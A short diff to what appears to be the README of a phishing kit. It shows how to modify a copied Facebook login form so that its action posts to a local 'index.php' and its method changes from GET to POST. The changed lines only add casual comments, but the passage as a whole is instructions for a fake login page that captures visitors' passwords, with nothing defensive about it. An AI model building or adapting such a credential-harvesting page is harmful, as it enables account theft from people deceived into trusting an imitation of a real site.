@@ -10,8 +10,8 @@ Password: (Password)
 
 ### index.html (form)
 ```html
-<form class="_9vtf" 
-data-testid="royal_login_form" 
+<form class="_9vtf" <!-- idk? you can remove it if you want to -->
+data-testid="royal_login_form" <!-- idk? you can remove it if you want to -->
 action="./index.php"  <!-- replacing facebook login action to local "index.php" -->
 method="post"> <!-- replacing "get" to "post" -->
 ```
